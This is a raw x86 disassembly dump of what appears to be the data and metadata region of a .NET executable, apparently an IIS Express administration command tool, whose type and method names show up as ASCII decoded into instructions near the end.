  405077:	add    DWORD PTR [edi],esi
  405079:	and    BYTE PTR [ebp+0x46014105],al
  40507f:	and    BYTE PTR [ebp+0x52026105],cl
  405085:	and    BYTE PTR [eax],dl
  405087:	add    BYTE PTR [ecx+0x0],bh
  40508a:	jb     0x4050ac
  40508c:	test   BYTE PTR [ebx],0x59
  40508f:	add    ch,ch
  405091:	add    dl,BYTE PTR [edi+0x7b014105]
  405097:	and    BYTE PTR [ebp-0x79fda6fe],ah
  40509d:	and    BYTE PTR [ebp-0x6bfecefb],bl
  4050a3:	and    dh,dh
  4050a5:	add    esi,DWORD PTR [ecx+0x2]
  4050a8:	test   al,0x20
  4050aa:	push   ds
  4050ab:	add    BYTE PTR [ecx+0x2],dh
  4050ae:	mov    esi,0x7905b220
  4050b3:	add    cl,bh
  4050b5:	and    BYTE PTR [edx-0x27fd86fb],bh
  4050bb:	and    bl,al
  4050bd:	add    eax,0x1d730009
  4050c2:	retf   0x7105
  4050c5:	add    ch,bh
  4050c7:	and    bh,cl
  4050c9:	add    eax,0x20fc0281
  4050ce:	(bad)  
  4050cf:	add    eax,0x212f0131
  4050d4:	add    al,0x6
  4050d6:	xor    DWORD PTR [ecx],eax
  4050d8:	aaa    
  4050d9:	and    DWORD PTR [ecx],ecx
  4050db:	push   es
  4050dc:	add    DWORD PTR [eax],0x14b02ed
  4050e2:	inc    ecx
  4050e3:	add    DWORD PTR [ecx+0x21],eax
  4050e6:	pop    ss
  4050e7:	push   es
  4050e8:	inc    ecx
  4050e9:	add    DWORD PTR [eax+0x21],ebx
  4050ec:	sbb    eax,DWORD PTR [esi]
  4050ee:	or     DWORD PTR [eax],eax
  4050f0:	jno    0x405110
  4050f2:	test   BYTE PTR [ebx],0x79
  4050f5:	add    BYTE PTR [esi+0xc],al
  4050f8:	sub    BYTE PTR [esi],al
  4050fa:	xor    DWORD PTR [ecx],eax
  4050fc:	jge    0x40511f
  4050fe:	xor    al,0x6
  405100:	push   ecx
  405101:	add    ebp,ebp
  405103:	add    dl,BYTE PTR [eax]
  405105:	add    BYTE PTR [ecx+0x3c219202],bl
  40510b:	push   es
  40510c:	cdq    
  40510d:	add    bl,BYTE PTR [ebx+0x6901a421]
  405113:	add    BYTE PTR [edx+0x31001021],ah
  405119:	add    DWORD PTR [ecx+eiz*1+0x141064d],ebp
  405120:	mov    dl,0x21
  405122:	push   esp
  405123:	push   es
  405124:	test   eax,0x1021d002
  405129:	add    BYTE PTR [ecx+0x1],ch
  40512c:	fsub   DWORD PTR [ecx]
  40512e:	push   ds
  40512f:	add    BYTE PTR [ecx],dh
  405131:	add    DWORD PTR [edi],esi
  405133:	and    DWORD PTR [esi+0x6],edi
  405136:	xor    DWORD PTR [ecx],eax
  405138:	call   0x8146d45e
  40513d:	add    BYTE PTR [edx],al
  40513f:	push   ds
  405140:	out    dx,eax
  405141:	add    BYTE PTR [ecx],dh
  405143:	add    DWORD PTR [edi],edx
  405145:	push   ds
  405146:	popf   
  405147:	push   es
  405148:	jno    0x40514a
  40514a:	add    esp,DWORD PTR [edx]
  40514c:	scas   eax,DWORD PTR es:[edi]
  40514d:	push   es
  40514e:	jno    0x405150
  405150:	push   ss
  405151:	and    dh,BYTE PTR [esi+0x23007906]
  405157:	and    dh,BYTE PTR [edx+0x1]
  40515a:	mov    eax,ds:0xbc222d02
  40515f:	push   es
  405160:	mov    eax,ds:0xbc223502
  405165:	push   es
  405166:	mov    eax,ds:0xbc223d02
  40516b:	push   es
  40516c:	mov    cl,0x1
  40516e:	in     eax,dx
  40516f:	add    al,BYTE PTR [esi+0x1]
  405172:	mov    cl,0x1
  405174:	inc    esi
  405175:	and    ah,BYTE PTR [edx]
  405177:	add    al,0xc1
  405179:	add    dl,BYTE PTR [ebx+0x22]
  40517c:	retf   0xc106
  40517f:	add    dl,BYTE PTR [edi+0x22]
  405182:	rol    BYTE PTR [esi],1
  405184:	test   eax,0xa4219b01
  405189:	add    DWORD PTR [ecx+0x2227501],esp
  40518f:	pop    es
  405190:	leave  
  405191:	add    cl,BYTE PTR [edi+0x31070722]
  405197:	add    DWORD PTR [esi-0x4ef8f0de],edx
  40519d:	add    DWORD PTR [esi+0x22],eax
  4051a0:	adc    eax,0xa101a107
  4051a5:	and    al,BYTE PTR [edx]
  4051a7:	pop    es
  4051a8:	rol    DWORD PTR [edx],1
  4051aa:	iret   
  4051ab:	and    BYTE PTR [ecx],ch
  4051ad:	pop    es
  4051ae:	mov    eax,ds:0x5222bf01
  4051b3:	add    al,0xa1
  4051b5:	add    ebx,ecx
  4051b7:	and    bh,BYTE PTR [edx]
  4051b9:	pop    es
  4051ba:	xor    DWORD PTR [ecx],eax
  4051bc:	loop   0x4051e0
  4051be:	add    al,0x6
  4051c0:	fld    DWORD PTR [edx]
  4051c2:	in     eax,dx
  4051c3:	add    dl,BYTE PTR [eax]
  4051c5:	add    BYTE PTR [eax],cl
  4051c7:	add    BYTE PTR [eax],ch
  4051c9:	add    BYTE PTR [ebp+0x0],bh
  4051cc:	or     BYTE PTR [eax],al
  4051ce:	sub    al,0x0
  4051d0:	add    BYTE PTR [eax],0x8
  4051d3:	add    BYTE PTR [eax],dh
  4051d5:	add    BYTE PTR [edi+0x34000800],al
  4051db:	add    BYTE PTR [eax+eax*1+0x380008],cl
  4051e2:	xchg   ecx,eax
  4051e3:	add    BYTE PTR [eax],cl
  4051e5:	add    BYTE PTR [eax+eax*1],bh
  4051e8:	xchg   esi,eax
  4051e9:	add    BYTE PTR [eax],cl
  4051eb:	add    BYTE PTR [eax+0x0],al
  4051ee:	fwait
  4051ef:	add    BYTE PTR [eax],cl
  4051f1:	add    BYTE PTR [eax+eax*1-0x60],al
  4051f5:	add    BYTE PTR [eax],cl
  4051f7:	add    BYTE PTR [eax+0x0],cl
  4051fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051fb:	add    BYTE PTR [eax],cl
  4051fd:	add    BYTE PTR [eax+eax*1-0x56],cl
  405201:	add    BYTE PTR [eax],cl
  405203:	add    BYTE PTR [eax+0x0],dl
  405206:	scas   eax,DWORD PTR es:[edi]
  405207:	add    BYTE PTR [eax],cl
  405209:	add    BYTE PTR [eax+eax*1-0x4c],dl
  40520d:	add    BYTE PTR [eax],cl
  40520f:	add    BYTE PTR [eax+0x0],bl
  405212:	mov    ecx,0x5c000800
  405217:	add    BYTE PTR [esi+0x60000800],bh
  40521d:	add    bl,al
  40521f:	add    BYTE PTR [eax],cl
  405221:	add    BYTE PTR [eax+eax*1-0x38],ah
  405225:	add    BYTE PTR [eax],cl
  405227:	add    BYTE PTR [eax+0x0],ch
  40522a:	int    0x0
  40522c:	or     BYTE PTR [eax],al
  40522e:	ins    BYTE PTR es:[edi],dx
  40522f:	add    dl,dl
  405231:	add    BYTE PTR [eax],cl
  405233:	add    BYTE PTR [eax+0x0],dh
  405236:	xlat   BYTE PTR ds:[ebx]
  405237:	add    BYTE PTR [eax],cl
  405239:	add    BYTE PTR [eax+eax*1-0x24],dh
  40523d:	add    BYTE PTR [eax],cl
  40523f:	add    BYTE PTR [eax+0x0],bh
  405242:	loope  0x405244
  405244:	or     BYTE PTR [eax],al
  405246:	test   al,0x0
  405248:	jg     0x40524b
  40524a:	or     BYTE PTR [eax],al
  40524c:	lods   al,BYTE PTR ds:[esi]
  40524d:	add    bh,dl
  40524f:	add    BYTE PTR [eax],cl
  405251:	add    BYTE PTR [eax+0x8008c00],dh
  405257:	add    BYTE PTR [eax+eax*1+0x800cd],dh
  40525e:	mov    eax,0x8007d00
  405263:	add    BYTE PTR [eax+eax*1+0x80082],bh
  40526a:	rol    BYTE PTR [eax],0x87
  40526d:	add    BYTE PTR [eax],cl
  40526f:	add    ah,al
  405271:	add    BYTE PTR [eax+eax*1+0xc80008],cl
  405278:	xchg   ecx,eax
  405279:	add    BYTE PTR [eax],cl
  40527b:	add    ah,cl
  40527d:	add    BYTE PTR [esi-0x2ffff800],dl
  405283:	add    BYTE PTR [ecx+eax*1+0xd40008],al
  40528a:	mov    DWORD PTR [ecx],eax
  40528c:	or     BYTE PTR [eax],al
  40528e:	fadd   DWORD PTR [eax]
  405290:	mov    es,WORD PTR [ecx]
  405292:	or     BYTE PTR [eax],al
  405294:	fadd   QWORD PTR [eax]
  405296:	xchg   ebx,eax
  405297:	add    DWORD PTR [eax],ecx
  405299:	add    al,ah
  40529b:	add    BYTE PTR [esi-0x1bfff800],dl
  4052a1:	add    BYTE PTR [eax-0x17fff7ff],bl
  4052a7:	add    BYTE PTR [edx-0xffff800],al
  4052ad:	add    BYTE PTR [ebp+0x0],bh
  4052b0:	or     BYTE PTR [eax],al
  4052b2:	hlt    
  4052b3:	add    BYTE PTR [edx-0x7fff800],al
  4052b9:	add    bh,dl
  4052bb:	add    BYTE PTR [eax],cl
  4052bd:	add    BYTE PTR [eax],al
  4052bf:	add    DWORD PTR [ebp+0x0],edi
  4052c2:	or     BYTE PTR [eax],al
  4052c4:	add    al,0x1
  4052c6:	add    BYTE PTR [eax],0x8
  4052c9:	add    BYTE PTR [eax],cl
  4052cb:	add    edi,edx
  4052cd:	add    BYTE PTR [eax],cl
  4052cf:	add    BYTE PTR [ecx+eax*1],cl
  4052d2:	xchg   DWORD PTR [eax],eax
  4052d4:	or     BYTE PTR [eax],al
  4052d6:	adc    BYTE PTR [ecx],al
  4052d8:	std    
  4052d9:	add    DWORD PTR [eax],ecx
  4052db:	add    BYTE PTR [ecx+eax*1],dl
  4052de:	add    al,BYTE PTR [edx]
  4052e0:	or     BYTE PTR [eax],al
  4052e2:	sbb    BYTE PTR [ecx],al
  4052e4:	pop    es
  4052e5:	add    cl,BYTE PTR [eax]
  4052e7:	add    BYTE PTR [ecx+eax*1],bl
  4052ea:	mov    WORD PTR [eax],es
  4052ec:	or     BYTE PTR [eax],al
  4052ee:	and    BYTE PTR [ecx],al
  4052f0:	or     al,0x2
  4052f2:	or     BYTE PTR [eax],al
  4052f4:	je     0x4052f7
  4052f6:	jge    0x4052f8
  4052f8:	or     BYTE PTR [eax],al
  4052fa:	js     0x4052fd
  4052fc:	add    BYTE PTR [eax],0x8
  4052ff:	add    BYTE PTR [ecx+eax*1-0x29],bh
  405303:	add    BYTE PTR [eax],cl
  405305:	add    BYTE PTR [eax+0x8017f01],ah
  40530b:	add    BYTE PTR [ecx+eax*1+0x8007d],ah
  405312:	test   al,0x1
  405314:	add    BYTE PTR [eax],0x8
  405317:	add    BYTE PTR [ecx+eax*1+0x800d7],ch
  40531e:	mov    al,0x1
  405320:	xchg   DWORD PTR [eax],eax
  405322:	or     BYTE PTR [eax],al
  405324:	mov    ah,0x1
  405326:	std    
  405327:	add    DWORD PTR [eax],ecx
  405329:	add    BYTE PTR [eax+0x8020201],bh
  40532f:	add    BYTE PTR [ecx+eax*1+0x80207],bh
  405336:	les    eax,FWORD PTR [ecx]
  405338:	jg     0x40533b
  40533a:	or     BYTE PTR [eax],al
  40533c:	enter  0x7d01,0x0
  405340:	or     BYTE PTR [eax],al
  405342:	int3   
  405343:	add    DWORD PTR [edx-0x2ffff800],eax
  405349:	add    edi,edx
  40534b:	add    BYTE PTR [eax],cl
  40534d:	add    ah,dl
  40534f:	add    DWORD PTR [edi-0x27fff800],eax
  405355:	add    ebp,edi
  405357:	add    DWORD PTR [esi],ecx
  405359:	add    ah,bl
  40535b:	add    ebp,eax
  40535d:	add    ah,BYTE PTR [edi]
  40535f:	add    BYTE PTR [ebx+0x29007d04],bh
  405365:	add    BYTE PTR [ebx+0x2e055f02],ch
  40536b:	add    BYTE PTR [ebx],ch
  40536d:	add    BYTE PTR [ebx+0x7],cl
  405370:	add    BYTE PTR cs:[ebx],bh
  405373:	add    BYTE PTR [ecx+0x7],dl
  405376:	add    BYTE PTR cs:[ebx+0x0],al
  40537a:	js     0x405383
  40537c:	add    BYTE PTR cs:[ebx+0x2e087700],dl
  405383:	add    BYTE PTR [ebx+0x0],dl
  405386:	rol    BYTE PTR [edi],cl
  405388:	add    BYTE PTR cs:[ebx+0x2e086e00],cl
  40538f:	add    BYTE PTR [ebx],ah
  405391:	add    BYTE PTR [ebx+0x7],al
  405394:	add    BYTE PTR cs:[ebx+0x0],cl
  405398:	mov    bh,0x7
  40539a:	add    BYTE PTR cs:[ebx+0x0],ah
  40539e:	aas    
  40539f:	or     BYTE PTR [esi],ch
  4053a1:	add    BYTE PTR [ebx+0x0],bl
  4053a4:	loop   0x4053ad
  4053a6:	add    BYTE PTR cs:[ebx+0x0],ch
  4053aa:	dec    ebx
  4053ab:	pop    es
  4053ac:	add    BYTE PTR cs:[ebx+0x0],dh
  4053b0:	inc    ebp
  4053b1:	or     BYTE PTR [esi],ch
  4053b3:	add    BYTE PTR [ebx+0x49055f00],al
  4053b9:	add    BYTE PTR [ebx-0x3cfaa0fe],ch
  4053bf:	add    BYTE PTR [ebx+0x2],cl
  4053c2:	jge    0x4053c4
  4053c4:	add    eax,DWORD PTR [ecx]
  4053c6:	arpl   WORD PTR [edx],ax
  4053c8:	mov    ebp,0x6b010304
  4053cd:	add    ch,dh
  4053cf:	add    al,0x23
  4053d1:	add    DWORD PTR [ebx+0x23007d02],eax
  4053d7:	add    DWORD PTR [ebx],edx
  4053d9:	add    DWORD PTR [ebp+0x0],edi
  4053dc:	and    eax,DWORD PTR [ecx]
  4053de:	jnp    0x4053e2
  4053e0:	test   DWORD PTR [ebx+eax*4],0x7d011303
  4053e7:	add    BYTE PTR [ebx],al
  4053e9:	add    BYTE PTR ds:0x17002303,dl
  4053ef:	add    esp,DWORD PTR ds:0x2f031900
  4053f5:	add    BYTE PTR [ebx],bl
  4053f7:	add    esi,DWORD PTR [ecx]
  4053f9:	add    BYTE PTR [ebx],bl
  4053fb:	add    esi,DWORD PTR ds:0x3b031d00
  405401:	add    BYTE PTR [eax],ah
  405403:	add    eax,DWORD PTR [ecx+0x0]
  405406:	sbb    eax,DWORD PTR [ebx]
  405408:	inc    ebx
  405409:	add    BYTE PTR [ebx],bl
  40540b:	add    eax,DWORD PTR [edi+0x0]
  40540e:	and    BYTE PTR [ebx],al
  405410:	dec    ebx
  405411:	add    BYTE PTR [eax],ah
  405413:	add    edx,DWORD PTR [eax+eax*1+0x960315]
  40541a:	adc    eax,0xef009a03
  40541f:	push   es
  405420:	pushf  
  405421:	add    bh,ch
  405423:	push   es
  405424:	int    0x0
  405426:	adc    eax,0x1500cf03
  40542b:	add    edx,edi
  40542d:	add    BYTE PTR ds:0x1500d903,dl
  405433:	add    esp,ecx
  405435:	add    BYTE PTR ds:0x1500e303,dl
  40543b:	add    ebp,ecx
  40543d:	add    BYTE PTR ds:0x1500eb03,dl
  405443:	add    ebp,ebp
  405445:	add    BYTE PTR ds:0x6000803,dl
  40544b:	add    BYTE PTR [esi+0x3f03e808],dl
  405451:	add    al,0x64
  405453:	add    al,0x8a
  405455:	add    al,0xaf
  405457:	add    al,0x4c
  405459:	add    eax,0x5a30592
  40545e:	fld    QWORD PTR ds:0x620060f
  405464:	cs push es
  405466:	inc    edx
  405467:	push   es
  405468:	pop    edx
  405469:	push   es
  40546a:	imul   eax,DWORD PTR [esi],0x68c066d
  405470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405471:	push   es
  405472:	rol    DWORD PTR [esi],0xd5
  405475:	push   es
  405476:	fld    QWORD PTR [esi]
  405478:	in     eax,0x6
  40547a:	out    0x0,al
  40547c:	jmp    0x405484
  40547e:	icebp  
  40547f:	push   es
  405480:	cmc    
  405481:	push   es
  405482:	sbb    eax,DWORD PTR [edi]
  405484:	and    al,0x7
  405486:	xor    BYTE PTR [edi],al
  405488:	cmp    eax,0x1000907
  40548d:	add    BYTE PTR [edx],cl
  40548f:	add    BYTE PTR ds:0xe000b00,cl
  405495:	add    BYTE PTR [eax],al
  405497:	add    BYTE PTR [eax],ch
  405499:	pop    es
  40549a:	xor    eax,DWORD PTR [ecx]
  40549c:	add    BYTE PTR [eax],al
  40549e:	xchg   esi,eax
  40549f:	or     BYTE PTR [eax],bh
  4054a1:	add    DWORD PTR [eax],eax
  4054a3:	add    BYTE PTR [esi+0x13d08],bl
  4054a9:	add    BYTE PTR [edi+0x13d08],ch
  4054af:	add    BYTE PTR [edi+0x13d08],bh
  4054b5:	add    bh,dl
  4054b7:	or     BYTE PTR ds:0xec000001,bh
  4054bd:	or     BYTE PTR ds:0x3000001,bh
  4054c3:	or     DWORD PTR ds:0x12000001,edi
  4054c9:	or     DWORD PTR ds:0x28000001,edi
  4054cf:	or     DWORD PTR ds:0x3f000001,edi
  4054d5:	or     DWORD PTR ds:0x58000001,edi
  4054db:	or     DWORD PTR ds:0xae000001,edi
  4054e1:	or     DWORD PTR [eax+0x1],ebp
  4054e4:	add    BYTE PTR [eax],al
  4054e6:	retf   
  4054e7:	or     DWORD PTR [ebx+0x1],edi
  4054ea:	add    al,BYTE PTR [eax]
  4054ec:	sbb    al,BYTE PTR [eax]
  4054ee:	add    eax,DWORD PTR [eax]
  4054f0:	add    al,BYTE PTR [eax]
  4054f2:	sbb    eax,DWORD PTR [eax]
  4054f4:	add    eax,0x1c000100
  4054f9:	add    BYTE PTR ds:0x1d000200,al
  4054ff:	add    BYTE PTR [edi],al
  405501:	add    BYTE PTR [edx],al
  405503:	add    BYTE PTR [esi],bl
  405505:	add    BYTE PTR [ecx],cl
  405507:	add    BYTE PTR [edx],al
  405509:	add    BYTE PTR [edi],bl
  40550b:	add    BYTE PTR [ebx],cl
  40550d:	add    BYTE PTR [edx],al
  40550f:	add    BYTE PTR [eax],ah
  405511:	add    BYTE PTR ds:0x21000200,cl
  405517:	add    BYTE PTR [edi],cl
  405519:	add    BYTE PTR [edx],al
  40551b:	add    BYTE PTR [edx],ah
  40551d:	add    BYTE PTR [ecx],dl
  40551f:	add    BYTE PTR [edx],al
  405521:	add    BYTE PTR [ebx],ah
  405523:	add    BYTE PTR [ebx],dl
  405525:	add    BYTE PTR [edx],al
  405527:	add    BYTE PTR [eax+eax*1],ah
  40552a:	adc    eax,0x25000200
  40552f:	add    BYTE PTR [edi],dl
  405531:	add    BYTE PTR [edx],al
  405533:	add    BYTE PTR [esi],ah
  405535:	add    BYTE PTR [ecx],bl
  405537:	add    BYTE PTR [edx],al
  405539:	add    BYTE PTR [edi],ah
  40553b:	add    BYTE PTR [ebx],bl
  40553d:	add    BYTE PTR [edx],al
  40553f:	add    BYTE PTR [ecx],dh
  405541:	add    BYTE PTR ds:0x371a9f00,bl
  405547:	push   ds
  405548:	and    BYTE PTR gs:[ebx+0x22],bl
  40554c:	push   0x82040922
  405551:	add    eax,0x50104
  405556:	repz add al,BYTE PTR [ecx]
  405559:	add    BYTE PTR [ecx+eax*1],al
  40555c:	pop    es
  40555d:	add    BYTE PTR [ebx+eax*1+0x1],dl
  405561:	add    BYTE PTR [ecx+eax*1],al
  405564:	or     DWORD PTR [eax],eax
  405566:	outs   dx,BYTE PTR ds:[esi]
  405567:	add    eax,DWORD PTR [ecx]
  405569:	add    BYTE PTR ds:0x6d002501,al
  40556f:	add    al,0x2
  405571:	add    BYTE PTR [eax],al
  405573:	add    DWORD PTR [ebp+0x0],esp
  405576:	mov    edi,0x40000309
  40557b:	add    DWORD PTR [edi+0x4108d00],ecx
  405581:	add    BYTE PTR [ecx+eax*1-0x6f],al
  405585:	add    BYTE PTR [ecx+0x4000410],ah
  40558b:	add    DWORD PTR [ebx+0x410c500],edx
  405591:	add    BYTE PTR [ecx+eax*1],al
  405594:	xchg   ebp,eax
  405595:	add    bh,dl
  405597:	adc    BYTE PTR [eax+eax*1],al
  40559a:	add    BYTE PTR [ecx],al
  40559c:	xchg   edi,eax
  40559d:	add    al,ch
  40559f:	adc    BYTE PTR ds:0x99010000,al
  4055a5:	add    BYTE PTR [eax],al
  4055a7:	adc    DWORD PTR ds:0x9b010000,eax
  4055ad:	add    BYTE PTR [eax],bl
  4055af:	adc    DWORD PTR ds:0x9d010000,eax
  4055b5:	add    BYTE PTR ds:0x4000511,ch
  4055bb:	add    DWORD PTR [edi+0x5113800],ebx
  4055c1:	add    BYTE PTR [ecx+eax*1],al
  4055c4:	mov    eax,ds:0x5115200
  4055c9:	add    BYTE PTR [ecx+eax*1],al
  4055cc:	mov    ds:0x4117000,eax
  4055d1:	add    BYTE PTR [ecx+eax*1],al
  4055d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055d5:	add    BYTE PTR [ecx+0x4000411],cl
  4055db:	add    DWORD PTR [edi+0x4119e00],esp
  4055e1:	add    BYTE PTR [ecx+eax*1],al
  4055e4:	test   eax,0x411a600
  4055e9:	add    BYTE PTR [ecx+eax*1],al
  4055ec:	stos   DWORD PTR es:[edi],eax
  4055ed:	add    BYTE PTR [edi+0x44000309],bh
  4055f3:	add    DWORD PTR [ebp+0x311b500],ebp
  4055f9:	add    BYTE PTR [ecx+eax*1],al
  4055fc:	rol    DWORD PTR [eax],0xb6
  4055ff:	adc    al,BYTE PTR ds:0x800400
  405605:	add    BYTE PTR [edi],al
  405607:	add    BYTE PTR [ecx],cl
  405609:	add    BYTE PTR [eax],al
  40560b:	add    BYTE PTR [eax],al
  40560d:	add    BYTE PTR [ecx],al
  40560f:	add    BYTE PTR [eax],al
  405611:	add    BYTE PTR [esi],dh
  405613:	add    esi,DWORD PTR [edx+0x1a]
  405616:	add    BYTE PTR [eax],al
  405618:	add    al,BYTE PTR [eax]
	...
  405622:	add    BYTE PTR [eax],al
  405624:	add    DWORD PTR [eax],eax
  405626:	inc    esi
  405627:	add    al,BYTE PTR [eax]
  405629:	add    BYTE PTR [eax],al
  40562b:	add    BYTE PTR [ecx],al
	...
  405635:	add    BYTE PTR [eax],al
  405637:	add    BYTE PTR [edx],ah
  405639:	add    BYTE PTR [edx+0x3],bl
  40563f:	add    BYTE PTR [edx],al
	...
  405649:	add    BYTE PTR [eax],al
  40564b:	add    BYTE PTR [ecx],al
  40564d:	add    BYTE PTR [edi+0x2],cl
	...
  405658:	add    DWORD PTR [eax],eax
  40565a:	add    BYTE PTR [eax],al
  40565c:	sbb    BYTE PTR [ebx],ah
  40565e:	add    BYTE PTR [eax],al
  405660:	push   es
  405661:	add    BYTE PTR ds:0x5000700,al
  405667:	add    BYTE PTR ds:0xe000c00,cl
  40566d:	add    BYTE PTR [eax+eax*1],cl
  405670:	str    WORD PTR [eax+eax*1]
  405674:	adc    BYTE PTR [eax],al
  405676:	or     al,0x0
  405678:	adc    DWORD PTR [eax],eax
  40567a:	or     al,0x0
  40567c:	adc    al,BYTE PTR [eax]
  40567e:	or     al,0x0
  405680:	adc    eax,DWORD PTR [eax]
  405682:	or     al,0x0
  405684:	adc    al,0x0
  405686:	or     al,0x0
  405688:	adc    eax,0x16000c00
  40568d:	add    BYTE PTR [eax+eax*1],cl
  405690:	pop    ss
  405691:	add    BYTE PTR [eax+eax*1],cl
  405694:	sbb    BYTE PTR [eax],al
  405696:	or     al,0x0
  405698:	sbb    eax,DWORD PTR [eax]
  40569a:	sbb    al,BYTE PTR [eax]
  40569c:	add    BYTE PTR [eax],al
  40569e:	add    BYTE PTR [eax],al
  4056a0:	pop    ebx
  4056a1:	add    BYTE PTR [esi+0x9],bl
  4056a7:	add    BYTE PTR [eax],al
  4056a9:	cmp    al,0x4d
  4056ab:	outs   dx,DWORD PTR ds:[esi]
  4056ac:	fs jne 0x40571b
  4056af:	gs add BYTE PTR ds:[ecx+0x69],cl
  4056b4:	jae    0x4056fb
  4056b6:	js     0x405728
  4056b8:	jb     0x40571f
  4056ba:	jae    0x40572f
  4056bc:	popa   
  4056bd:	fs ins DWORD PTR es:[edi],dx
  4056bf:	imul   ebp,DWORD PTR [esi+0x43],0x652e646d
  4056c6:	js     0x40572d
  4056c8:	add    BYTE PTR [eax+0x61],dl
  4056cb:	jb     0x40572e
  4056cd:	ins    DWORD PTR es:[edi],dx
  4056ce:	gs je  0x405736
  4056d1:	jb     0x405746
  4056d3:	add    BYTE PTR [ebp+0x69],cl
  4056d6:	arpl   WORD PTR [edx+0x6f],si
  4056d9:	jae    0x40574a
  4056db:	data16 je 0x40570c
  4056de:	push   edi
  4056df:	bound  ebp,QWORD PTR gs:[esi]
  4056e2:	dec    ecx
  4056e3:	imul   esi,DWORD PTR [ebx+0x45],0x65727078
  4056ea:	jae    0x40575f
  4056ec:	cs inc ecx
  4056ee:	fs ins DWORD PTR es:[edi],dx
  4056f0:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  4056f7:	je     0x405762
  4056f9:	outs   dx,DWORD PTR ds:[esi]
  4056fa:	outs   dx,BYTE PTR ds:[esi]
  4056fb:	push   esp
  4056fc:	popa   
  4056fd:	jae    0x40576a
  4056ff:	jae    0x405755
  405701:	outs   dx,DWORD PTR ds:[esi]
  405702:	outs   dx,DWORD PTR ds:[esi]
  405703:	ins    BYTE PTR es:[edi],dx
  405704:	add    BYTE PTR [ebp+0x78],al
  405707:	jo     0x40577b
  405709:	gs jae 0x40577f
  40570c:	dec    eax
  40570d:	gs ins BYTE PTR es:[edi],dx
  40570f:	jo     0x405776
  405711:	jb     0x405713
  405713:	push   eax
  405714:	jb     0x405785
  405716:	addr16 jb 0x40577a
  405719:	ins    DWORD PTR es:[edi],dx
  40571a:	add    BYTE PTR [esi+0x61],cl
  40571d:	je     0x405788
  40571f:	jbe    0x405786
  405721:	dec    ebp
  405722:	gs je  0x40578d
  405725:	outs   dx,DWORD PTR ds:[esi]
  405726:	fs jae 0x405729
  405729:	inc    ebx
  40572a:	dec    esp
  40572b:	push   ebx
  40572c:	inc    ebx
  40572d:	push   esp
  40572e:	pop    eax
  40572f:	add    BYTE PTR [edx+0x49],al
  405732:	dec    esi
  405733:	inc    esp
  405734:	pop    edi
  405735:	dec    edi
  405736:	push   eax
  405737:	push   esp
  405738:	push   ebx
  405739:	xor    eax,DWORD PTR [eax]
  40573b:	dec    ecx
  40573c:	inc    esp
  40573d:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  405744:	add    BYTE PTR [edx+0x65],dl
  405747:	jae    0x4057b8
  405749:	jne    0x4057bd
  40574b:	arpl   WORD PTR [ebp+0x0],sp
  40574e:	dec    ecx
  40574f:	dec    ecx
  405750:	push   ebx
  405751:	inc    ebp
  405752:	js     0x4057c4
  405754:	jb     0x4057bb
  405756:	jae    0x4057cb
  405758:	inc    ecx
  405759:	fs ins DWORD PTR es:[edi],dx
  40575b:	imul   ebp,DWORD PTR [esi+0x43],0x5300646d
  405762:	popa   
  405763:	gs inc di
  405766:	ins    BYTE PTR es:[edi],dx
  405767:	outs   dx,DWORD PTR ds:[esi]
  405768:	bound  esp,QWORD PTR [ecx+0x6c]
  40576b:	inc    ecx
  40576c:	ins    BYTE PTR es:[edi],dx
  40576d:	ins    BYTE PTR es:[edi],dx
  40576e:	outs   dx,DWORD PTR ds:[esi]
  40576f:	arpl   WORD PTR [eax+0x61],cx
  405772:	outs   dx,BYTE PTR ds:[esi]
  405773:	fs ins BYTE PTR es:[edi],dx
  405775:	add    BYTE PTR gs:[ebp+0x69],cl
  405779:	arpl   WORD PTR [edx+0x6f],si
  40577c:	jae    0x4057ed
  40577e:	data16 je 0x4057af
  405781:	push   edi
  405782:	bound  ecx,QWORD PTR gs:[ebp+0x61]
  405786:	je     0x4057fa
  405788:	imul   edi,DWORD PTR [eax+0x2e],0x6c697455
  40578f:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x65666153
  405797:	dec    esi
  405798:	popa   
  405799:	je     0x405804
  40579b:	jbe    0x405802
  40579d:	dec    ebp
  40579e:	gs je  0x405809
  4057a1:	outs   dx,DWORD PTR ds:[esi]
  4057a2:	fs jae 0x4057a5
  4057a5:	push   ebp
  4057a6:	jae    0x40580d
  4057a8:	jb     0x4057aa
  4057aa:	push   esp
  4057ab:	dec    edi
  4057ac:	dec    ebx
  4057ad:	inc    ebp
  4057ae:	dec    esi
  4057af:	pop    edi
  4057b0:	inc    ebp
  4057b1:	dec    esp
  4057b2:	inc    ebp
  4057b3:	push   esi
  4057b4:	inc    ecx
  4057b5:	push   esp
  4057b6:	dec    ecx
  4057b7:	dec    edi
  4057b8:	dec    esi
  4057b9:	pop    edi
  4057ba:	push   esp
  4057bb:	pop    ecx
  4057bc:	push   eax
  4057bd:	inc    ebp
  4057be:	add    BYTE PTR [ebx+0x49],dl
  4057c1:	inc    esp
  4057c2:	pop    edi
  4057c3:	dec    esi
  4057c4:	inc    ecx
  4057c5:	dec    ebp
  4057c6:	inc    ebp
  4057c7:	pop    edi
  4057c8:	push   ebp
  4057c9:	push   ebx
  4057ca:	inc    ebp
  4057cb:	add    BYTE PTR [esi+0x45],cl
  4057ce:	push   esp
  4057cf:	pop    edi
  4057d0:	push   esi
  4057d1:	inc    ecx
  4057d2:	dec    esp
  4057d3:	dec    ecx
  4057d4:	inc    esp
  4057d5:	inc    ecx
  4057d6:	push   esp
  4057d7:	inc    ebp
  4057d8:	pop    edi
  4057d9:	push   eax
  4057da:	inc    ecx
  4057db:	push   ebx
  4057dc:	push   ebx
  4057dd:	push   edi
  4057de:	dec    edi
  4057df:	push   edx
  4057e0:	inc    esp
  4057e1:	pop    edi
  4057e2:	push   edx
  4057e3:	inc    ebp
  4057e4:	push   ebx
  4057e5:	inc    ebp
  4057e6:	push   esp
  4057e7:	pop    edi
  4057e8:	dec    ecx
  4057e9:	dec    esi
  4057ea:	push   eax
  4057eb:	push   ebp
  4057ec:	push   esp
  4057ed:	pop    edi
  4057ee:	inc    ecx
  4057ef:	push   edx
  4057f0:	inc    edi
  4057f1:	add    BYTE PTR [esi+0x45],cl
  4057f4:	push   esp
  4057f5:	pop    edi
  4057f6:	push   esi
  4057f7:	inc    ecx
  4057f8:	dec    esp
  4057f9:	dec    ecx
  4057fa:	inc    esp
